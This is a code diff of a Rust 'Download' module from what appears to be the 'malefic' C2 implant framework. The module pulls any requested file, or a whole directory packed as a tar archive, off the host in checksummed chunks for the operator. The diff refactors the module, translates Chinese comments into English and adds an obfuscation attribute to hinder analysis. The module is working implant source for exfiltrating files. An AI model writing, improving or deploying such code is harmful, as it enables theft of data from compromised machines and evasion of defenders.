@@ -1,16 +1,17 @@
 use crate::{check_field, check_request, Module, ModuleImpl, TaskResult};
 use async_trait::async_trait;
-use malefic_helper::common::filesys::{check_sum, check_sum_bytes};
-use malefic_helper::debug;
-use malefic_proto::proto::modulepb::{DownloadResponse, DownloadRequest};
-use malefic_proto::proto::implantpb::{spite::Body};
-use malefic_trait::module_impl;
-use std::fs::{metadata, read_dir, File, OpenOptions};
+use futures::SinkExt;
+use malefic_common::debug;
+use malefic_gateway::module_impl;
+use malefic_gateway::obfuscate;
+use malefic_module::ModuleResult;
+use malefic_proto::proto::implantpb::spite::Body;
+use malefic_proto::proto::modulepb::{DownloadRequest, DownloadResponse};
+use malefic_sysinfo::filesys::{check_sum_bytes, check_sum_read};
+use std::fs::{read_dir, File};
 use std::io::{Cursor, Read, Seek, Write};
 use std::path::Path;
-use futures::SinkExt;
 use tar::{Builder, Header};
-use malefic_proto::ModuleResult;
 
 pub struct Download {}
 
@@ -19,19 +20,20 @@ pub struct Download {}
 impl Module for Download {}
 
 #[async_trait]
+#[obfuscate]
 impl ModuleImpl for Download {
     async fn run(
         &mut self,
         id: u32,
-        receiver: &mut malefic_proto::module::Input,
-        sender: &mut malefic_proto::module::Output,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
     ) -> ModuleResult {
         let request = check_request!(receiver, Body::DownloadRequest)?;
 
         if request.dir {
-            self.download_dir(id,receiver, sender, request).await
+            self.download_dir(id, receiver, sender, request).await
         } else {
-            self.download_file(id,receiver, sender, request).await
+            self.download_file(id, receiver, sender, request).await
         }
     }
 }
@@ -39,43 +41,48 @@ impl ModuleImpl for Download {
 impl Download {
     pub async fn download_file(
         &mut self,
-        id : u32,
-        receiver: &mut malefic_proto::module::Input,
-        sender: &mut malefic_proto::module::Output,
-        request: DownloadRequest
+        id: u32,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
+        request: DownloadRequest,
     ) -> ModuleResult {
         let path: String = check_field!(request.path)?;
-        let mut file = OpenOptions::new().read(true).open(path.clone())?;
-
-        let sum = check_sum(&path)?;
-        let metadata = metadata(&path)?;
-        let size = metadata.len();
+        let mut file = File::open(&path)?;
+        let size = file.metadata()?.len();
+        let sum = check_sum_read(&mut file)?;
         debug!("checksum: {}, size: {}", sum, size);
         let _ = sender
             .send(TaskResult::new_with_body(
                 id,
                 Body::DownloadResponse(DownloadResponse {
-                    checksum: (sum),
-                    size: (size),
+                    checksum: sum,
+                    size: size,
                     cur: 0,
                     content: Vec::new(),
                 }),
             ))
             .await?;
 
-        let buffer_size = request.buffer_size ;
-        let total_cur = size / buffer_size as u64 + 1;
-        let mut buffer = vec![0; buffer_size as usize];
+        let buffer_size = request.buffer_size as usize;
+        let total_cur = (size as usize + buffer_size - 1) / buffer_size;
+        let mut buffer = vec![0u8; buffer_size];
 
         loop {
-
             let drequest = check_request!(receiver, Body::DownloadRequest)?;
-            debug!("Receive DownloadRequest, cur: {}",drequest.cur);
+            debug!("Receive DownloadRequest, cur: {}", drequest.cur);
             let cur = drequest.cur;
             let buffer_size = drequest.buffer_size as usize;
-            let byte_offset = (cur -1) as u64 * buffer_size as u64;
-            let _position = file.seek(std::io::SeekFrom::Start(byte_offset))?;
-            let n = file.read(&mut buffer)?;
+            let byte_offset = (cur - 1) as u64 * buffer_size as u64;
+            file.seek(std::io::SeekFrom::Start(byte_offset))?;
+            let mut total_read = 0;
+            while total_read < buffer_size {
+                let n = file.read(&mut buffer[total_read..])?;
+                if n == 0 {
+                    break;
+                }
+                total_read += n;
+            }
+            let n = total_read;
             let sha256sum = check_sum_bytes(&buffer[..n])?;
             debug!("checksum: {}, size: {}, cur: {}", sha256sum.clone(), n, cur);
             let resp = DownloadResponse {
@@ -85,34 +92,35 @@ impl Download {
                 content: buffer[..n].to_vec(),
             };
 
-            if drequest.cur == -1 || cur == total_cur as i32 || n < buffer_size  {
-                debug!("Send spite[{}] success, end",cur);
-                return Ok(TaskResult::new_with_body(id,Body::DownloadResponse(resp)));
-            } else{
-                let _ = sender.send(
-                    TaskResult::new_with_body(
-                        id,
-                        Body::DownloadResponse(resp)
-                    )).await?;
-                debug!("Send spite[{}] success",cur);
+            if drequest.cur == -1 || cur == total_cur as i32 || n < buffer_size {
+                debug!("Send spite[{}] success, end", cur);
+                return Ok(TaskResult::new_with_body(id, Body::DownloadResponse(resp)));
+            } else {
+                let _ = sender
+                    .send(TaskResult::new_with_body(id, Body::DownloadResponse(resp)))
+                    .await?;
+                debug!("Send spite[{}] success", cur);
             }
         }
     }
 
     pub async fn download_dir(
-        &mut self ,
-        id : u32,
-        receiver: &mut malefic_proto::module::Input,
-        sender: &mut malefic_proto::module::Output,
-        request: DownloadRequest
+        &mut self,
+        id: u32,
+        receiver: &mut malefic_module::Input,
+        sender: &mut malefic_module::Output,
+        request: DownloadRequest,
     ) -> ModuleResult {
         let path: String = check_field!(request.path)?;
         let archive_buffer = self.create_tar_archive(&path)?;
         let sha256sum = check_sum_bytes(archive_buffer.as_slice())?;
         let size = archive_buffer.len() as u64;
-        debug!("TAR打包完成，总大小: {} 字节, checksum: {}", size, sha256sum);
+        debug!(
+            "TAR packaging complete, total size: {} bytes, checksum: {}",
+            size, sha256sum
+        );
 
-        // 发送初始响应，包含总大小和校验和
+        // Send initial response with total size and checksum
         let _ = sender
             .send(TaskResult::new_with_body(
                 id,
@@ -136,14 +144,14 @@ impl Download {
             let buffer_size = drequest.buffer_size as usize;
             let byte_offset = ((cur - 1) as u64 * buffer_size as u64) as usize;
 
-            // 计算当前分片的实际大小
+            // Calculate actual size of current chunk
             let chunk_size = if byte_offset + buffer_size > archive_buffer.len() {
                 archive_buffer.len() - byte_offset
             } else {
                 buffer_size
             };
 
-            // 从内存中的tar包数据提取分片
+            // Extract chunk from in-memory tar package data
             let chunk_data = if byte_offset < archive_buffer.len() {
                 &archive_buffer[byte_offset..byte_offset + chunk_size]
             } else {
@@ -151,7 +159,12 @@ impl Download {
             };
 
             let chunk_checksum = check_sum_bytes(chunk_data)?;
-            debug!("checksum: {}, size: {}, cur: {}", chunk_checksum, chunk_data.len(), cur);
+            debug!(
+                "checksum: {}, size: {}, cur: {}",
+                chunk_checksum,
+                chunk_data.len(),
+                cur
+            );
 
             let resp = DownloadResponse {
                 checksum: chunk_checksum,
@@ -164,11 +177,9 @@ impl Download {
                 debug!("Send spite[{}] success, end", cur);
                 return Ok(TaskResult::new_with_body(id, Body::DownloadResponse(resp)));
             } else {
-                let _ = sender.send(
-                    TaskResult::new_with_body(
-                        id,
-                        Body::DownloadResponse(resp)
-                    )).await?;
+                let _ = sender
+                    .send(TaskResult::new_with_body(id, Body::DownloadResponse(resp)))
+                    .await?;
                 debug!("Send spite[{}] success", cur);
             }
         }
@@ -198,8 +209,7 @@ impl Download {
             base_path.join(relative_path)
         };
 
-        for entry in read_dir(&current_path)? {
-            let entry = entry?;
+        for entry in read_dir(&current_path)?.flatten() {
             let file_name = entry.file_name().to_string_lossy().to_string();
             let entry_relative_path = if relative_path.is_empty() {
                 file_name.clone()
@@ -207,10 +217,13 @@ impl Download {
                 format!("{}/{}", relative_path, file_name)
             };
 
-            let metadata = entry.metadata()?;
+            let metadata = match entry.metadata() {
+                Ok(m) => m,
+                Err(_) => continue,
+            };
 
             if metadata.is_dir() {
-                // 添加目录条目
+                // Add directory entry
                 let mut header = Header::new_gnu();
                 header.set_path(&entry_relative_path)?;
                 header.set_size(0);
@@ -219,10 +232,10 @@ impl Download {
                 header.set_cksum();
                 tar_builder.append(&header, std::io::empty())?;
 
-                // 递归处理子目录
+                // Recursively process subdirectories
                 self.add_directory_to_tar(tar_builder, base_path, &entry_relative_path)?;
             } else {
-                // 添加文件
+                // Add file
                 let mut file = File::open(entry.path())?;
                 let mut header = Header::new_gnu();
                 header.set_path(&entry_relative_path)?;
@@ -232,7 +245,11 @@ impl Download {
                 header.set_cksum();
                 tar_builder.append(&header, &mut file)?;
 
-                debug!("Added file to TAR: {} ({} 字节)", entry_relative_path, metadata.len());
+                debug!(
+                    "Added file to TAR: {} ({} bytes)",
+                    entry_relative_path,
+                    metadata.len()
+                );
             }
         }
         Ok(())
@@ -246,8 +263,7 @@ impl Download {
 
     #[cfg(windows)]
     fn get_permissions(&self, _metadata: &std::fs::Metadata) -> u32 {
-        // Windows下简化处理，返回标准权限
+        // Simplified handling on Windows, return standard permissions
         0o644
     }
 }
-
